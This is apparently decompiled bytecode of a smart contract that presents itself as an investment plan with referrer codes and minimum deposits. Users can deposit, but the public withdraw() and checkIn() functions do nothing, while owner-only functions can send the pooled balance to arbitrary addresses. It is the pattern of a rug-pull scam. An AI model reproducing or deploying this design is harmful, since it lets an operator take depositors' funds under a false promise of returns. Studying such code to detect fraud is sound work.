contract main {




// =====================  Runtime code  =====================


const getBalance = eth.balance(this.address)

const getInvestmentDate = block.timestamp

const REFERRER_CODE = 1

const MINIMUM = 5 * 10^6


address owner;
mapping of uint256 sub_1ed89777;
uint256 latestReferrerCode;
uint256 totalInvestments;
uint256 totalUsers;
address marketingAccount;
address safeWalletAddress;
address deductionWalletAddress;
uint256 sub_cb71299f;
mapping of uint256 address2UID;
mapping of struct addressByUID;
uint256 stor13;

function address2UID(address arg1) {
    require calldata.size - 4 >= 32
    return address2UID[arg1]
}

function sub_1ed89777(?) {
    require calldata.size - 4 >= 32
    return sub_1ed89777[arg1]
}

function getAddressByUID(uint256 arg1) {
    require calldata.size - 4 >= 32
    return addressByUID[arg1].field_0
}

function getSafeWallet() {
    require msg.sender == owner
    return safeWalletAddress
}

function latestReferrerCode() {
    return latestReferrerCode
}

function getMarketingAccount() {
    require msg.sender == owner
    return marketingAccount
}

function owner() {
    return owner
}

function getWithdrawalStatus() {
    require msg.sender == owner
    return sub_cb71299f
}

function getTotalUsers() {
    return totalUsers
}

function uid2Investor(uint256 arg1) {
    require calldata.size - 4 >= 32
    return addressByUID[arg1].field_0, 
           addressByUID[arg1].field_256,
           addressByUID[arg1].field_512,
           addressByUID[arg1].field_768,
           addressByUID[arg1].field_1024,
           addressByUID[arg1].field_1280
}

function sub_cb71299f(?) {
    return sub_cb71299f
}

function getDeductionWallet() {
    require msg.sender == owner
    return deductionWalletAddress
}

function getTotalInvestments() {
    return totalInvestments
}

function getUIDByAddress(address arg1) {
    require calldata.size - 4 >= 32
    return address2UID[address(arg1)]
}

function checkIn() {
  stop
}

function withdraw() payable {
  stop
}

function sub_ad54cc3f(?) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1
    deductionWalletAddress = arg1
}

function setWithdrawalStatus(uint256 arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    sub_cb71299f = arg1
    return 1
}

function setSafeWallet(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1
    safeWalletAddress = arg1
}

function setMarketingAccount(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1
    marketingAccount = arg1
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1
    emit onOwnershipTransferred(owner, arg1);
    owner = arg1
}

function transferToAddress(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    if not arg1:
        revert with 0, 'Owner only'
    call msg.sender with:
       value arg2 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    emit onWithdraw(msg.sender, arg2);
}

function sub_eed5fcec(?) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    if eth.balance(0) >= arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    52,
                    0xfe4572726f72212c20646f65736e277420616c6c6f7720746f207472616e73666572207472782073696d756c74616e656f75736c,
                    mem[216 len 12]
    call arg2 with:
       value arg1 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    emit onWithdraw(msg.sender, arg1);
}

function sub_9804c0a9(?) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    if arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    55,
                    0x737769746864726177616c20646f65736e277420616c6c6f7720746f207472616e73666572207472782073696d756c74616e656f75736c,
                    mem[219 len 9]
    if not address2UID[address(arg2)]:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    43,
                    0x7943616e206e6f742077697468647261772062656361757365206e6f20616e7920696e766573746d656e74,
                    mem[207 len 21]
    if sub_cb71299f == 1:
        call arg2 with:
           value arg1 wei
             gas 2300 * is_zero(value) wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        emit onWithdraw(msg.sender, arg1);
}

function sub_3480678f(?) {
    require calldata.size - 4 >= 64
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    require arg2 <= 4294967296
    require arg2 + 36 <= calldata.size
    require arg2.length <= 4294967296 and arg2 + (32 * arg2.length) + 36 <= calldata.size
    mem[(32 * arg1.length) + 128] = arg2.length
    mem[(32 * arg1.length) + 160 len 32 * arg2.length] = call.data[arg2 + 36 len 32 * arg2.length]
    mem[(32 * arg1.length) + (32 * arg2.length) + 160] = 0
    require msg.sender == owner
    if sub_cb71299f == 1:
        idx = 0
        while idx < arg1.length:
            require idx < arg1.length
            require idx < arg2.length
            call mem[(32 * idx) + 140 len 20] with:
               value mem[(32 * idx) + (32 * arg1.length) + 160] wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require idx < arg2.length
            _22 = mem[(32 * idx) + (32 * arg1.length) + 160]
            mem[(32 * arg1.length) + (32 * arg2.length) + 160] = msg.sender
            mem[(32 * arg1.length) + (32 * arg2.length) + 192] = _22
            emit onWithdraw(msg.sender, _22);
            idx = idx + 1
            continue 
}

function _fallback() payable {
    if msg.value:
        if 0 >= stor13:
            revert with 0, 'Wrong investment plan id'
        if msg.value < 5 * 10^6:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        51,
                        0x794c657373207468616e20746865206d696e696d756d20616d6f756e74206f66206465706f73697420726571756972656d656e,
                        mem[215 len 13]
        if address2UID[address(msg.sender)]:
            addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_0 = 0
            addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_256 = block.timestamp
            addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_768 = block.timestamp
            addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_512 = msg.value
            addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_1024 = 0
            addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_1280 = 0
            require addressByUID[stor11[address(msg.sender)]].field_1024 + 1 >= addressByUID[stor11[address(msg.sender)]].field_1024
            addressByUID[stor11[address(msg.sender)]].field_1024++
        else:
            require latestReferrerCode + 1 >= latestReferrerCode
            latestReferrerCode++
            address2UID[address(msg.sender)] = latestReferrerCode
            addressByUID[stor2].field_0 = msg.sender
            addressByUID[stor2].field_768 = 0
            addressByUID[stor2].field_1024 = 0
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_0 = 0
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_256 = block.timestamp
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_768 = block.timestamp
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_512 = msg.value
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_1024 = 0
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_1280 = 0
            require addressByUID[stor2].field_1024 + 1 >= addressByUID[stor2].field_1024
            addressByUID[stor2].field_1024++
        require totalInvestments + msg.value >= totalInvestments
        totalInvestments += msg.value
        require totalUsers + 1 >= totalUsers
        totalUsers++
        emit onInvest(msg.sender, msg.value);
}

function invest(uint256 arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 < 0:
        revert with 0, 'Wrong investment plan id'
    if arg2 >= stor13:
        revert with 0, 'Wrong investment plan id'
    if msg.value < 5 * 10^6:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    51,
                    0x794c657373207468616e20746865206d696e696d756d20616d6f756e74206f66206465706f73697420726571756972656d656e,
                    mem[215 len 13]
    if address2UID[address(msg.sender)]:
        addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_0 = arg2
        addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_256 = block.timestamp
        addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_768 = block.timestamp
        addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_512 = msg.value
        addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_1024 = 0
        addressByUID[stor11[address(msg.sender)]][6][addressByUID[stor11[address(msg.sender)]].field_1024].field_1280 = 0
        require addressByUID[stor11[address(msg.sender)]].field_1024 + 1 >= addressByUID[stor11[address(msg.sender)]].field_1024
        addressByUID[stor11[address(msg.sender)]].field_1024++
    else:
        require latestReferrerCode + 1 >= latestReferrerCode
        latestReferrerCode++
        address2UID[address(msg.sender)] = latestReferrerCode
        addressByUID[stor2].field_0 = msg.sender
        if arg1 < 1:
            addressByUID[stor2].field_768 = 0
        else:
            if addressByUID[arg1].field_0:
                addressByUID[stor2].field_768 = arg1
            else:
                addressByUID[stor2].field_768 = 0
        addressByUID[stor2].field_1024 = 0
        addressByUID[stor2][6][addressByUID[stor2].field_1024].field_0 = arg2
        addressByUID[stor2][6][addressByUID[stor2].field_1024].field_256 = block.timestamp
        addressByUID[stor2][6][addressByUID[stor2].field_1024].field_768 = block.timestamp
        addressByUID[stor2][6][addressByUID[stor2].field_1024].field_512 = msg.value
        addressByUID[stor2][6][addressByUID[stor2].field_1024].field_1024 = 0
        addressByUID[stor2][6][addressByUID[stor2].field_1024].field_1280 = 0
        require addressByUID[stor2].field_1024 + 1 >= addressByUID[stor2].field_1024
        addressByUID[stor2].field_1024++
    require totalInvestments + msg.value >= totalInvestments
    totalInvestments += msg.value
    require totalUsers + 1 >= totalUsers
    totalUsers++
    emit onInvest(msg.sender, msg.value);
}

function grant(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 < 0:
        revert with 0, 'Wrong investment plan id'
    if arg2 >= stor13:
        revert with 0, 'Wrong investment plan id'
    if msg.value < 5 * 10^6:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    51,
                    0x794c657373207468616e20746865206d696e696d756d20616d6f756e74206f66206465706f73697420726571756972656d656e,
                    mem[215 len 13]
    if not address2UID[address(msg.sender)]:
        if address2UID[address(arg1)]:
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_0 = arg2
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_256 = block.timestamp
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_768 = block.timestamp
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_512 = msg.value
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_1024 = 0
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_1280 = 0
            require addressByUID[stor11[address(arg1)]].field_1024 + 1 >= addressByUID[stor11[address(arg1)]].field_1024
            addressByUID[stor11[address(arg1)]].field_1024++
        else:
            require latestReferrerCode + 1 >= latestReferrerCode
            latestReferrerCode++
            address2UID[address(arg1)] = latestReferrerCode
            addressByUID[stor2].field_0 = arg1
            addressByUID[stor2].field_768 = 0
            addressByUID[stor2].field_1024 = 0
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_0 = arg2
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_256 = block.timestamp
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_768 = block.timestamp
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_512 = msg.value
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_1024 = 0
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_1280 = 0
            require addressByUID[stor2].field_1024 + 1 >= addressByUID[stor2].field_1024
            addressByUID[stor2].field_1024++
    else:
        if address2UID[address(arg1)]:
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_0 = arg2
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_256 = block.timestamp
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_768 = block.timestamp
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_512 = msg.value
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_1024 = 0
            addressByUID[stor11[address(arg1)]][6][addressByUID[stor11[address(arg1)]].field_1024].field_1280 = 0
            require addressByUID[stor11[address(arg1)]].field_1024 + 1 >= addressByUID[stor11[address(arg1)]].field_1024
            addressByUID[stor11[address(arg1)]].field_1024++
        else:
            require latestReferrerCode + 1 >= latestReferrerCode
            latestReferrerCode++
            address2UID[address(arg1)] = latestReferrerCode
            addressByUID[stor2].field_0 = arg1
            if address2UID[address(msg.sender)] < 1:
                addressByUID[stor2].field_768 = 0
            else:
                if addressByUID[stor11[address(msg.sender)]].field_0:
                    addressByUID[stor2].field_768 = address2UID[address(msg.sender)]
                else:
                    addressByUID[stor2].field_768 = 0
            addressByUID[stor2].field_1024 = 0
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_0 = arg2
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_256 = block.timestamp
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_768 = block.timestamp
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_512 = msg.value
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_1024 = 0
            addressByUID[stor2][6][addressByUID[stor2].field_1024].field_1280 = 0
            require addressByUID[stor2].field_1024 + 1 >= addressByUID[stor2].field_1024
            addressByUID[stor2].field_1024++
    require totalInvestments + msg.value >= totalInvestments
    totalInvestments += msg.value
    require totalUsers + 1 >= totalUsers
    totalUsers++
    emit onGrant(msg.sender, address(arg1), msg.value);
}



}
